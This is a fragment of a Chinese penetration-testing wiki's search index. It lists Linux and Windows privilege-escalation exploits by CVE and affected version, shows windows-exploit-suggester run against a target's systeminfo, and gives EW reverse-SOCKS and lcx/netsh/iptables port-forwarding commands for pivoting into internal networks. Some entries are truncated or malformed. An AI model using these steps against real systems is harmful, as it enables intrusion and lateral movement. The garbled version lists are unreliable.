零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-19 11:46:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2004/1.html":{"url":"提权EXP/Linux/2004/1.html","title":"2004","keywords":"","body":" CVE-2005-0736　　[krad3](2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11) CVE-2005-1263　　[binfmt_elf.c](Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:38:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2006/1.html":{"url":"提权EXP/Linux/2006/1.html","title":"2006","keywords":"","body":" CVE-2006-3626　　[h00lyshit](2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16) CVE-2006-2451　　[raptor_prctl](2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:49:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2008/1.html":{"url":"提权EXP/Linux/2008/1.html","title":"2008","keywords":"","body":" CVE-2008-4210　　[ftrex](2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22) CVE-2008-0600　　[vmsplice2](2.6.23, 2.6.24) CVE-2008-0600　　[vmsplice1](2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:50:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2009/1.html":{"url":"提权EXP/Linux/2009/1.html","title":"2009","keywords":"","body":" CVE-2009-3547　　[pipe.c_32bit](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31) CVE-2009-2698　　[udp_sendmsg_32bit](2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19) CVE-2009-2692　　[sock_sendpage](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30) CVE-2009-2692　　[sock_sendpage2](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30) CVE-2009-1337　　[exit_notify](2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29) CVE-2009-1185　　[udev](2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:55:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2010/1.html":{"url":"提权EXP/Linux/2010/1.html","title":"2010","keywords":"","body":" CVE-2010-4347　　[american-sign-language]( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-4258　　[full-nelson](2.6.31, 2.6.32, 2.6.35, 2.6.37) CVE-2010-4073　　[half_nelson](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3904　　[rds](2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3437　　[pktcdvd](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3301　　[ptrace_kmod2](2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34) CVE-2010-3081　　[video4linux](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33) CVE-2010-2959　　[can_bcm](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-1146　　[reiserfs](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34) CVE-2010-0415　　[do_pages_move](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:56:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2012/1.html":{"url":"提权EXP/Linux/2012/1.html","title":"2012","keywords":"","body":" CVE-2012-3524　　[libdbus](libdbus 1.5.x and earlier) CVE-2012-0056　　[memodipper](2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:57:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2013/1.html":{"url":"提权EXP/Linux/2013/1.html","title":"2013","keywords":"","body":" CVE-2013-2094　　[perf_swevent](3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4, 3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9) CVE-2013-1858　　[clown-newuser](3.3-3.8) CVE-2013-1763　　[__sock_diag_rcv_msg](before 3.8.3) CVE-2013-0268　　[msr](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:58:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2014/1.html":{"url":"提权EXP/Linux/2014/1.html","title":"2014","keywords":"","body":" CVE-2014-5284　　[OSSEC](2.8) CVE-2014-4699　　[ptrace](before 3.15.4) CVE-2014-4014　　[Local Privilege Escalation](before 3.14.8) CVE-2014-3153　　[futex](3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8 ,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1) CVE-2014-0196　　[rawmodePTY](2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15) CVE-2014-0038　　[timeoutpwn](3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:58:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2015/1.html":{"url":"提权EXP/Linux/2015/1.html","title":"2015","keywords":"","body":" CVE-2015-7547　　[glibc getaddrinfo](before Glibc 2.9) CVE-2015-1328　　[overlayfs](3.13, 3.16.0, 3.19.0) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:59:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2016/1.html":{"url":"提权EXP/Linux/2016/1.html","title":"2016","keywords":"","body":" CVE-2016-9793　　[a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options](Linux kernel before 4.8.14) CVE-2016-5195　　[Dirty cow](Linux kernel>2.6.22 (released in 2007)) CVE-2016-2384　　[a double-free in USB MIDI driver](Linux kernel before 4.5) CVE-2016-0728　　[pp_key](3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 14:59:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2017/1.html":{"url":"提权EXP/Linux/2017/1.html","title":"2017","keywords":"","body":" CVE-2017-1000367　　[Sudo] (Sudo 1.8.6p7 - 1.8.20) CVE-2017-1000112　　[a memory corruption due to UFO to non-UFO path switch] CVE-2017-16995　　[Memory corruption caused by BPF verifier] (Linux kernel before 4.14 - 4.4) CVE-2017-16939　　[UAF in Netlink socket subsystem – XFRM] (Linux kernel before 4.13.11) CVE-2017-7494　　[Samba Remote execution](Samba 3.5.0-4.6.4/4.5.10/4.4.14) CVE-2017-7308　　[a signedness issue in AF_PACKET sockets](Linux kernel through 4.10.6) CVE-2017-6074　　[a double-free in DCCP protocol](Linux kernel through 4.9.11) CVE-2017-5123　　['waitid()'](Kernel 4.14.0-rc4+) , 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 15:00:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2018/1.html":{"url":"提权EXP/Linux/2018/1.html","title":"2018","keywords":"","body":" CVE–2018–18955　　[map_write() in kernel/user_namespace.c allows privilege escalation](Linux kernel 4.15.x through 4.19.x before 4.19.2) CVE–2018–1000001　　[glibc](glibc 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 15:00:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2019/1.html":{"url":"提权EXP/Linux/2019/1.html","title":"2019","keywords":"","body":" CVE-2019-13272　　[Linux Kernel](Linux Kernel 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 21:39:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Win/2.html":{"url":"提权EXP/Win/2.html","title":"Windows提权总结","keywords":"","body":"windows提权exp汇总 下载地址 | | Win2003 | Win2008 | Win2012 | Win2016 | Vista | XP | Win7 | Win8 | Win10 | Win2019 | Win2010 | Win2000 | |-----------------------------------|---------|---------|---------|---------|---------|---------|---------|---------|---------|---------|---------|---------| | CVE-2019-1405 | | | | | | | | | ✅ | ✅ | | | | CVE-2019-1388 | | | | | | |✅ | | ✅ | | | | | CVE-2019-0803 | | ✅ | ✅ | | | | ✅ | ✅ | ✅ | ✅ | | | | CVE-2018-8897 | | ✅ | ✅ | | | | ✅ | ✅ | ✅ | | | | | CVE-2018-8639 | | ✅ | ✅ | ✅ | | | ✅ | ✅ | ✅ | | | | | CVE-2018-1038 | | ✅ | | | | | ✅ | | | | | | | CVE-2018-0734 | | | | | | | | | ✅ | | | | | CVE-2018-8453 | | | | | | | | ✅ | ✅ | ✅ | | | | CVE-2018-8440 | | ✅ | ✅ | ✅ | | | ✅ | ✅ | ✅ | | | | | CVE-2018-0833 | | | ✅ | | | | | ✅ | | | | | | CVE-2018-8121 | ✅ | ✅ | | | | ✅ | ✅ | | | | | | | CVE-2018-8120 | | ✅ | | | | | ✅ | | | | | | | CVE-2018-0824 | | ✅ | ✅ | ✅ | | | ✅ | | ✅ | | | | | CVE-201-8464 | | ✅ | | ✅ | | | ✅ | ✅ | ✅ | | ✅ | | | CVE-2017-0213 | | ✅ | | ✅ | | | ✅ | ✅ | ✅ | | ✅ | | | MS17-017 | | | | | | | ✅ | ✅ | | | | | | MS17-010 | ✅ | ✅ | | | | ✅ | ✅ | | | | | | | MS16-135 | | | | ✅ | | | | | | | | | | MS16-111 | | | | | | | | ✅ | ✅ | | | | | MS16-098 | | | | | | | | ✅ | | | | | | MS16-075 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS16-034 　 | | ✅ | ✅ | | | | ✅ | ✅ | ✅ | | | | | MS16-032 | | ✅ | ✅ | | | | ✅ | ✅ | ✅ | | | | | MS16-016 | | ✅ | | | ✅ | | ✅ | | | | | | | MS16-014 | | ✅ | | | ✅ | | ✅ | | | | | | | MS15-097 | | | ✅ | | | | | ✅ | | | | | | MS15-076 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS15-077 | ✅ | ✅ | ✅ | | ✅ | ✅ | ✅ | ✅ | | | | ✅ | | MS15-061 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS15-051 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS15-015 | | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS15-010 | ✅ | ✅ | | | | | ✅ | ✅ | | | | | | MS15-001 | | ✅ | ✅ | | | | ✅ | ✅ | | | | | | CVE-2014-1767 | ✅ | ✅ | ✅ | | ✅ | | ✅ | ✅ | | | | | | MS14-070 | ✅ | | | | | | | | | | | | | MS14-068 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS14-066 | ✅ | ✅ | ✅ | | ✅ | | ✅ | ✅ | | | | | | MS14-058 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS14-040 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS14-002 | ✅ | | | | | ✅ | | | | | | | | MS13-053 | ✅ | ✅ | | | ✅ | ✅ | ✅ | | | | | | | MS13-046 | ✅ | ✅ | ✅ | | ✅ | | ✅ | | | | | | | MS13-005 | ✅ | ✅ | ✅ | | | | ✅ | ✅ | | | | | | MS12-042 | | ✅ | ✅ | | | | ✅ | | | | | | | MS12-020 | ✅ | ✅ | | | | ✅ | ✅ | | | | | | | MS11-080 | ✅ | | | | | ✅ | | | | | | | | MS11-062 | ✅ | | | | | ✅ | | | | | | | | MS11-046 | ✅ | ✅ | | | | ✅ | ✅ | | | | | | | MS11-011 | ✅ | ✅ | | | ✅ | ✅ | ✅ | | | | | | | MS10-092 | | ✅ | | | | | ✅ | | | | | | | MS10-065（iis5\\.1/6\\.0/7\\.0/7\\.5） | Iis | Iis | Iis | Iis | Iis | Iis | Iis | Iis | Iis | Iis | Iis | Iis | | MS10-059 | | ✅ | | | ✅ | | ✅ | | | | | | | MS10-048 | ✅ | ✅ | | | ✅ | ✅ | ✅ | | | | | | | MS10-015 | ✅ | ✅ | | | | ✅ | ✅ | | | | | | | MS10-012 | | ✅ | | | | | ✅ | | | | | | | MS09-050 | | ✅ | | | ✅ | | | | | | | | | MS09-020（iis5\\.1/6\\.1） | iis | iis | iis | iis | iis | iis | iis | iis | iis | iis | iis | iis | | MS09-012 | | ✅ | | | ✅ | | ✅ | | | | | | | MS08-068 | | | | | | ✅ | | | | | | ✅ | | MS08-067 | ✅ | ✅ | | | ✅ | ✅ | | | | | | ✅ | | MS08-066 | ✅ | | | | | ✅ | | | | | | ✅ | | MS08-025 | ✅ | ✅ | | | ✅ | ✅ | | | | | | | | MS06-040 | ✅ | | | | | ✅ | | | | | | ✅ | | MS05-039 | ✅ | | | | | ✅ | | | | | | ✅ | | MS03-026 | ✅ | | | | | ✅ | | | | | | ✅ | 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-07 17:32:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Win/1.html":{"url":"提权EXP/Win/1.html","title":"Win辅助提权脚本","keywords":"","body":"win辅助提权脚本 https://github.com/ianxtianxt/win-exp- 使用方法 1.首先需要更新漏洞数据库 $ ./windows-exploit-suggester.py --update [*] initiating... [*] successfully requested base url [*] scraped ms download url [+] writing to file 2017-06-14-mssb.xls [*] done 2.然后安装程序依赖：python-xlrd //pip install install dependencies //install python-xlrd, $ pip install xlrd --upgrade ubuntu@ubuntu:~/xlrd-0.9.4/xlrd-0.9.4$ sudo python setup.py install [sudo] password for ubuntu: running install running build running build_py running build_scripts running install_lib creating /usr/local/lib/python2.7/dist-packages/xlrd copying build/lib.linux-x86_64-2.7/xlrd/compdoc.py -> /usr/local/lib/python2.7/dist-packages/xlrd ...... 3.接着在目标机器中执行systeminfo，并将其输出到文件 win7sp1-systeminfo.txt 中，然而带入参数 –systeminfo 中，并指定数据库位置(就是那个excel文件) $ ./windows-exploit-suggester.py --database 2017-06-14-mssb.xls --systeminfo win7sp1-systeminfo.txt [*] initiating... [*] database file detected as xls or xlsx based on extension [*] reading from the systeminfo input file [*] querying database file for potential vulnerabilities [*] comparing the 15 hotfix(es) against the 173 potential bulletins(s) [*] there are now 168 remaining vulns [+] windows version identified as 'Windows 7 SP1 32-bit' [*] [M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical [M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical [M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical [M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical [M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical [M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [*] done 下面这条指令可以列出指定操作系统版本存在的所有可能EXP(假设目标系统没有打任何补丁) $ ./windows-exploit-suggester.py --database 2017-06-14-mssb.xls --ostext 'windows server 2008 r2' [*] initiating... [*] database file detected as xls or xlsx based on extension [*] getting OS information from command line text [*] querying database file for potential vulnerabilities [*] comparing the 0 hotfix(es) against the 196 potential bulletins(s) [*] there are now 196 remaining vulns [+] windows version identified as 'Windows 2008 R2 64-bit' [*] [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Im 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 23:31:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/ew/1.html":{"url":"内网渗透/内网穿透/ew/1.html","title":"ew","keywords":"","body":"EW正向代理 Web服务器的设置 如果是Linux系统 ./ew_for_linux64 -s ssocksd -l 1080 #监听本地的1080端口 如果是Windows系统 ew_for_Win.exe -s ssocksd -l 1080 #监听本地的1080端口 主机的设置 如果是Linux系统，配置proxychains代理链的配置文件，将代理设置成 100.100.10.12的1080端口：socks5 100.100.10.12 1080 然后命令前面加上 proxychains即可。如：proxychains curl 192.168.10.19 如果是Windows系统，直接浏览器中设置代理为 100.100.10.12的1080端口，或者利用 Proxifier 、sockscap64 设置全局代理 EW反向代理 Web服务器的设置 如果是Linux系统： ./ew_for_linux64 -s rssocks -d 100.100.10.13 -e 8888 #将本机的流量全部转发到100.100.10.13的8888端口 如果是Windows系统： ew_for_Win.exe -s rssocks -d 100.100.10.13 -e 8888 #将本机的流量全部转发到100.100.10.13的8888端口 主机的设置 如果是Linux系统： ./ew_for_linux64 -s rcsocks -l 1080 -e 8888 #将本机的8888端口的流量都转发给1080端口，这里8888端口只是用于传输流量 然后配置proxychains代理链的配置文件，将代理设置成 127.0.0.1的1080端口：socks5 127.0.0.1 1080 然后命令前面加上 proxychains即可。如：proxychains curl 192.168.10.19 如果是Windows系统 ew_for_Win.exe -s rcsocks -l 1080 -e 8888 #将本机的8888端口的流量都转发给1080端口，这里8888端口只是用于传输流量 然后浏览器中设置代理为 100.100.10.12的1080端口，或者利用 Proxifier 、sockscap64 设置全局代理 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 17:48:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/lcx/1.html":{"url":"内网渗透/内网穿透/lcx/1.html","title":"lcx","keywords":"","body":"实现LCX功能的参考方法 一.LCX简介 lcx是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网IP）任意端口。它是一款命令行工具，当然也可以在有权限的webshell下执行，正因如此lcx常被认为是一款黑客入侵工具，lcx在内网入侵渗透中起着重要的角色。lcx进行端口转发的原理就是使不同端口之间形成一个回路。它常用于外网连接内网3389等端口。 二.LCX实现思路 基于命令的LCX 在windows和linux 中都存在对于端口的转发命令，人们习惯于称呼为映射，英文为DNAT(Destination Network Address Translation)，官方名称为目的地址转换，这种方式在防火墙和路由器中比较常见。 windows 目的地址转换命令简介 Windows下使用netsh命令,来进行目的地址转换。netsh(Network Shell) 是一个windows系统本身**的功能强大的网络配置命令行工具。它允许从本地或远程显示或修改当前正在运行的计算机的网络配置。Netsh 命令的强大，目的地址映射只是其中小部分功能。如此强大的命令如何使用呢？ 命令|含义 ---|--- netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494|在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494。 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891|在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4|查看在IPV4下配置的端口转发的策略 linux 目的地址转换命令简介 Linux下使用iptables命令，来进行目的地址转换。在默认情况下，linux会禁用此类功能，需要手动开启。iptables是Linux 内核集成的 IP 信息包过滤系统，也就是人们常说的LINUX自带防火墙，经常被用于配置ACL(Access Control List)访问控制列表。iptables在不同的LINUX版本中存在不同的名称。2.0.X内核：ipfwadm，2.2.X内核：ipchains，2.4.X内核：iptables。目前linux版本基本为2.4.x以上，低版本的linux比较少见，下面讲解的命令，在2.4.x以上的内核版本linux中有效。 开启目的地址转发功能 临时修改法: echo 1 >/proc/sys/net/ipv4/ip_forward 永久修改法: vi /etc/sysctl.conf，net.ipv4.ip_forward = 1找到并修改值为1，sysctl –p（使之立即生效） 假设用户访问172.16.4.247:728时我想让它转发到172.16.4.97:80： # iptables -t nat -A PREROUTING -p tcp -d 113.108.110.61 --dport 728 -j DNAT --to-destination 172.16.4.97:80 # iptables -t nat -A POSTROUTING -p tcp -s 172.16.4.97 --sport 80 -j SNAT --to-source 172.16.4.247 # service iptables save（将当前规则保存到 /etc/sysconfig/iptables） 本机间不同的端口转发： iptables -t nat -A PREROUTING -p tcp --dport 729 -j REDIRECT --to-ports 80 service iptables save service iptables restart 自实现LCX 基于命令的LCX存在无法绕过杀毒软件的拦截，并且需要管理员权限等问题。所以大多数LCX是使用自实现目的地址转换的方式编写的工具。简单说下目的地址转换的原理。 目的地址转换的基本工作原理是当公网主机同一IP包发送至存在目的地址转换策略的主机端口时，将IP包中的目的地址以及端口进行替换，并且代发送给替换后的地址和端口。 